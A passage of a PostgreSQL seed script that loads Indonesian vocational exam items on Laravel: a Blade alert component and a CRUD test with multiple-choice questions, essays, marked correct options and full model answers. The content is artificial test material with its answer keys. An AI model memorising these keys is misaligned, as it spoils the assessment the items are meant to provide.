- Dipanggil dengan sintaks tag: <x-nama-component :prop="$val">slot</x-nama-component>
- Bisa punya logika di class-nya (validasi prop, computed property, dll)
- Support slot untuk konten yang lebih fleksibel
- Auto-discovery di app/View/Components/ + resources/views/components/

KODE BLADE COMPONENT ALERT:

// 1. Buat component: php artisan make:component Alert
// app/View/Components/Alert.php (class — opsional untuk komponen sederhana):
<?php
namespace App\View\Components;
use Illuminate\View\Component;

class Alert extends Component {
    public string $colorClass;
    public string $icon;

    public function __construct(
        public string $type = "info",
        public string $message = "",
    ) {
        $this->colorClass = match($type) {
            "success" => "alert-success",
            "error"   => "alert-error",
            "warning" => "alert-warning",
            default   => "alert-info",
        };
        $this->icon = match($type) {
            "success" => "✓",
            "error"   => "✕",
            "warning" => "⚠",
            default   => "ℹ",
        };
    }

    public function render() {
        return view("components.alert");
    }
}
?>

<!-- resources/views/components/alert.blade.php -->
<div class="alert {{ $colorClass }}" role="alert">
  <span class="alert-icon">{{ $icon }}</span>
  <span class="alert-message">{{ $message }}</span>
  {{ $slot }}  {{-- konten tambahan opsional --}}
</div>

<style>
.alert { display:flex; gap:.5rem; padding:.75rem 1rem; border-radius:8px; margin-bottom:1rem; }
.alert-success { background:#dcfce7; color:#166534; border:1px solid #86efac; }
.alert-error   { background:#fee2e2; color:#991b1b; border:1px solid #fca5a5; }
.alert-warning { background:#fef9c3; color:#854d0e; border:1px solid #fde047; }
.alert-info    { background:#dbeafe; color:#1e40af; border:1px solid #93c5fd; }
</style>

<!-- Penggunaan di Blade view: -->
<x-alert type="success" :message="session(''success'')" />
<x-alert type="error"   :message="$errorMessage" />
<x-alert type="warning" message="Sesi Anda akan habis dalam 5 menit." />

{{-- Dengan slot untuk konten lebih kompleks: --}}
<x-alert type="error">
  Terjadi kesalahan: <strong>{{ $error }}</strong>.
  <a href="/bantuan">Hubungi admin</a>.
</x-alert>

Nilai penuh: perbedaan component vs include + class component dengan match() untuk warna + file blade dengan $colorClass + $icon + $slot + contoh penggunaan <x-alert> minimal 3 tipe.')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t5, s, 7, 25);

  -- ==========================================================
  -- TES 6: CRUD DENGAN LARAVEL
  -- ==========================================================

  -- PG 1
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'Dalam form HTML untuk mengirim request DELETE atau PUT ke route Laravel, direktif Blade yang digunakan karena HTML form hanya mendukung GET dan POST adalah...',
    'pg', 'sedang',
    'HTML form hanya mendukung method GET dan POST. Laravel menyediakan @method(''DELETE'') atau @method(''PUT'') yang menyisipkan hidden input: <input type="hidden" name="_method" value="DELETE">. Laravel membaca field _method ini dan memperlakukan request sebagai DELETE/PUT meski secara HTTP adalah POST. Juga butuh @csrf untuk proteksi CSRF.')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.opsi_jawaban_kompetensi (id_soal_kompetensi, label, isi_opsi, is_benar) VALUES
    (s,'A','@delete ... @enddelete',false),
    (s,'B','@http(''DELETE'')',false),
    (s,'C','@method(''DELETE'')',true),
    (s,'D','method_override(''DELETE'')',false),
    (s,'E','Tidak bisa — harus pakai JavaScript fetch() untuk DELETE',false);
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t6, s, 1, 10);

  -- PG 2
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'Method Laravel untuk melakukan redirect ke route tertentu sambil membawa flash message yang ditampilkan satu kali adalah...',
    'pg', 'sedang',
    'redirect()->route(''nama.route'')->with(''success'', ''Data berhasil disimpan!'') mengirim flash message ke session yang hanya tersedia untuk satu request berikutnya. Di Blade: session(''success'') atau @if(session(''success'')). Flash message otomatis hilang setelah ditampilkan — tidak perlu menghapus manual.')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.opsi_jawaban_kompetensi (id_soal_kompetensi, label, isi_opsi, is_benar) VALUES
    (s,'A','return back()->flash(''success'', ''Berhasil'')',false),
    (s,'B','return redirect()->route(''nama.route'')->with(''success'', ''Berhasil'')',true),
    (s,'C','return redirect()->setMessage(''success'', ''Berhasil'')',false),
    (s,'D','return response()->redirect(''nama.route'', [''msg'' => ''Berhasil''])',false),
    (s,'E','return view()->withSuccess(''Berhasil'')',false);
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t6, s, 2, 10);

  -- PG 3
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'Cara paling singkat dan idiomatis untuk melakukan validasi request di Laravel Controller adalah...',
    'pg', 'sedang',
    '$request->validate([...]) langsung di controller: jika validasi gagal, otomatis redirect kembali ke halaman sebelumnya dengan error yang disimpan di session. Di Blade bisa ditampilkan dengan @error(''field'') ... @enderror atau $errors->get(''field''). Jika lolos, mengembalikan array data yang sudah divalidasi.')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.opsi_jawaban_kompetensi (id_soal_kompetensi, label, isi_opsi, is_benar) VALUES
    (s,'A','Validator::check($request->all(), [...])',false),
    (s,'B','$request->validate([''field'' => ''rules''])',true),
    (s,'C','$this->validate($request, [...])',false),
    (s,'D','new Validator($request->all(), [...])',false),
    (s,'E','validate($request, [''field'' => ''rules''])',false);
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t6, s, 3, 10);

  -- PG 4
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'Eloquent method yang paling tepat untuk mengambil satu record berdasarkan ID dan otomatis mengembalikan 404 jika tidak ditemukan adalah...',
    'pg', 'mudah',
    'findOrFail($id) mencari record dengan primary key $id. Jika ditemukan, mengembalikan model instance. Jika tidak ada, melempar ModelNotFoundException yang Laravel tangkap dan otomatis mengubahnya menjadi response 404. Lebih aman dari find($id) yang mengembalikan null dan bisa menyebabkan error "Call to member function on null".')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.opsi_jawaban_kompetensi (id_soal_kompetensi, label, isi_opsi, is_benar) VALUES
    (s,'A','find($id)',false),
    (s,'B','findById($id)',false),
    (s,'C','findOrFail($id)',true),
    (s,'D','first($id)',false),
    (s,'E','getById($id)',false);
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t6, s, 4, 10);

  -- PG 5
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'Untuk menampilkan pesan error validasi per field di Blade Laravel, directive yang digunakan adalah...',
    'pg', 'mudah',
    '@error(''nama_field'') {{ $message }} @enderror menampilkan pesan error validasi untuk field tertentu. $message adalah variabel yang otomatis tersedia berisi pesan error pertama untuk field tersebut. Bisa juga dipakai untuk kondisional styling: class="{{ $errors->has(''email'') ? ''is-invalid'' : '''' }}".')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.opsi_jawaban_kompetensi (id_soal_kompetensi, label, isi_opsi, is_benar) VALUES
    (s,'A','@validation(''field'') ... @endvalidation',false),
    (s,'B','@if($errors->nama_field) ... @endif',false),
    (s,'C','@error(''field'') {{ $message }} @enderror',true),
    (s,'D','@showError(''field'')',false),
    (s,'E','{{ $errors->get(''field'')[0] ?? '''' }}',false);
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t6, s, 5, 10);

  -- Essay 1
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'Bangunlah fitur CRUD "Manajemen Mata Pelajaran" lengkap menggunakan Laravel! Implementasikan: (a) route resource di web.php, (b) MapelController dengan method index (list semua + search), store (simpan + validasi), update (edit + validasi), destroy (hapus), (c) validasi: nama wajib min 3 karakter, kode unik, kkm antara 0-100, (d) redirect dengan flash message setelah setiap operasi, (e) tampilkan error validasi per field di form Blade!',
    'essay', 'sulit',
    'Jawaban ideal:

// (a) routes/web.php
Route::middleware([''auth''])->group(function () {
    Route::resource(''mapel'', MapelController::class);
});

// (b) app/Http/Controllers/MapelController.php
<?php
namespace App\Http\Controllers;

use App\Models\Mapel;
use Illuminate\Http\Request;

class MapelController extends Controller {

    public function index(Request $request) {
        $mapels = Mapel::when($request->search, function ($q) use ($request) {
                $q->where(''nama_mapel'', ''like'', ''%'' . $request->search . ''%'')
                  ->orWhere(''kode_mapel'', ''like'', ''%'' . $request->search . ''%'');
            })
            ->orderBy(''nama_mapel'')
            ->paginate(15)
            ->withQueryString(); // pertahankan ?search= di pagination link
        return view(''mapel.index'', compact(''mapels''));
    }

    public function create() {
        return view(''mapel.create'');
    }

    // (b + c + d) Store dengan validasi + flash
    public function store(Request $request) {
        $validated = $request->validate([
            ''nama_mapel'' => ''required|min:3|max:100'',
            ''kode_mapel'' => ''required|unique:mapel,kode_mapel|max:10'',
            ''kkm''        => ''required|integer|min:0|max:100'',
        ]);

        Mapel::create($validated);

        return redirect()->route(''mapel.index'')
            ->with(''success'', "Mata pelajaran {$validated[''nama_mapel'']} berhasil ditambahkan.");
    }

    public function edit(Mapel $mapel) {
        return view(''mapel.edit'', compact(''mapel''));
    }

    // Update dengan ignore current record saat validasi unique
    public function update(Request $request, Mapel $mapel) {
        $validated = $request->validate([
            ''nama_mapel'' => ''required|min:3|max:100'',
            ''kode_mapel'' => ''required|max:10|unique:mapel,kode_mapel,'' . $mapel->id,
            ''kkm''        => ''required|integer|min:0|max:100'',
        ]);

        $mapel->update($validated);

        return redirect()->route(''mapel.index'')
            ->with(''success'', "Mata pelajaran berhasil diperbarui.");
    }

    public function destroy(Mapel $mapel) {
        $nama = $mapel->nama_mapel;
        $mapel->delete();
        return redirect()->route(''mapel.index'')
            ->with(''success'', "Mata pelajaran $nama berhasil dihapus.");
    }
}

// (e) resources/views/mapel/create.blade.php (form dengan error)
@extends(''layouts.app'')
@section(''content'')
<h1>Tambah Mata Pelajaran</h1>
<form action="{{ route(''mapel.store'') }}" method="POST">
  @csrf

  <div class="form-group">
    <label>Nama Mapel</label>
    <input type="text" name="nama_mapel"
           value="{{ old(''nama_mapel'') }}"
           class="{{ $errors->has(''nama_mapel'') ? ''input-error'' : '''' }}">
    @error(''nama_mapel'') <span class="error-msg">{{ $message }}</span> @enderror
  </div>

  <div class="form-group">
    <label>Kode Mapel</label>
    <input type="text" name="kode_mapel" value="{{ old(''kode_mapel'') }}">
    @error(''kode_mapel'') <span class="error-msg">{{ $message }}</span> @enderror
  </div>

  <div class="form-group">
    <label>KKM (0-100)</label>
    <input type="number" name="kkm" value="{{ old(''kkm'', 75) }}" min="0" max="100">
    @error(''kkm'') <span class="error-msg">{{ $message }}</span> @enderror
  </div>

  <button type="submit" class="btn-primary">Simpan</button>
  <a href="{{ route(''mapel.index'') }}">Batal</a>
</form>
@endsection

Nilai penuh: Route::resource + index dengan search (when) + paginate + store/update dengan validate (termasuk unique ignore) + redirect with(''success'') + form @error per field + old() untuk repopulate.')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t6, s, 6, 25);

  -- Essay 2
  INSERT INTO public.soal_kompetensi (id_jurusan, pertanyaan, tipe_soal, tingkat_kesulitan, pembahasan)
  VALUES (v_jur,
    'Jelaskan konsep Form Request Validation di Laravel dan kapan sebaiknya menggunakan Form Request daripada $request->validate() langsung di controller! Kemudian implementasikan Form Request untuk fitur "Simpan Data Siswa" dengan validasi: NISN 10 digit unik, nama lengkap min 3 karakter, email valid dan unik, tanggal lahir format tanggal valid, kelas harus ada di tabel kelas. Sertakan custom error message dalam Bahasa Indonesia!',
    'essay', 'sedang',
    'Jawaban ideal:

Form Request vs $request->validate() langsung:

$request->validate() di controller:
- Cocok untuk validasi sederhana dan form yang tidak reuse
- Controller bisa menjadi gemuk (fat) jika banyak field
- Logika validasi dan logika bisnis campur dalam satu method

Form Request:
- Class terpisah yang merangkum aturan validasi dan otorisasi
- Cocok untuk: form kompleks banyak field, validasi yang dipakai di banyak tempat, ingin memisahkan concern, ingin menambahkan logika otorisasi (apakah user boleh submit form ini?)
- Controller tetap skinny (hanya terima $request yang sudah tervalidasi)
- Dibuat dengan: php artisan make:request StoreSiswaRequest

IMPLEMENTASI:
// php artisan make:request StoreSiswaRequest
// app/Http/Requests/StoreSiswaRequest.php
<?php
namespace App\Http\Requests;

use Illuminate\Foundation\Http\FormRequest;

class StoreSiswaRequest extends FormRequest {

    public function authorize(): bool {
        // Hanya guru/admin yang boleh submit
        return auth()->check() && in_array(auth()->user()->role, [''guru'', ''admin'']);
    }

    public function rules(): array {
        return [
            ''nisn''           => ''required|digits:10|unique:siswa,nisn'',
            ''nama_lengkap''   => ''required|string|min:3|max:100'',
            ''email''          => ''required|email|unique:siswa,email'',
            ''tanggal_lahir''  => ''required|date|before:today'',
            ''id_kelas''       => ''required|exists:kelas,id'',
        ];
    }

    public function messages(): array {
        return [
            ''nisn.required''          => ''NISN wajib diisi.'',
            ''nisn.digits''            => ''NISN harus tepat 10 digit angka.'',
            ''nisn.unique''            => ''NISN sudah terdaftar di sistem.'',
            ''nama_lengkap.required''  => ''Nama lengkap wajib diisi.'',
            ''nama_lengkap.min''       => ''Nama lengkap minimal 3 karakter.'',
            ''email.required''         => ''Email wajib diisi.'',
            ''email.email''            => ''Format email tidak valid.'',
            ''email.unique''           => ''Email sudah digunakan akun lain.'',
            ''tanggal_lahir.required'' => ''Tanggal lahir wajib diisi.'',
            ''tanggal_lahir.date''     => ''Format tanggal lahir tidak valid.'',
            ''tanggal_lahir.before''   => ''Tanggal lahir harus sebelum hari ini.'',
            ''id_kelas.required''      => ''Kelas wajib dipilih.'',
            ''id_kelas.exists''        => ''Kelas yang dipilih tidak valid.'',
        ];
    }
}

// Controller — jauh lebih bersih:
public function store(StoreSiswaRequest $request) {
    // $request sudah tervalidasi di sini
    Siswa::create($request->validated());
    return redirect()->route(''siswa.index'')
        ->with(''success'', ''Data siswa berhasil disimpan.'');
}

Nilai penuh: perbedaan Form Request vs validate() + kapan pakai Form Request + authorize() + rules() 5 field dengan rules tepat (digits, exists, before) + messages() semua dalam Bahasa Indonesia + controller skinny.')
  RETURNING id_soal_kompetensi INTO s;
  INSERT INTO public.kompetensi_tugas_soal (id_kompetensi_tugas, id_soal, nomor, bobot) VALUES (t6, s, 7, 25);

  RAISE NOTICE 'Seed berhasil: 1 kompetensi "Pemrograman Web Lanjutan" (tingkat=11, urutan=2), 6 tes, 42 soal (30 PG 5-opsi + 12 essay).';
END $$;
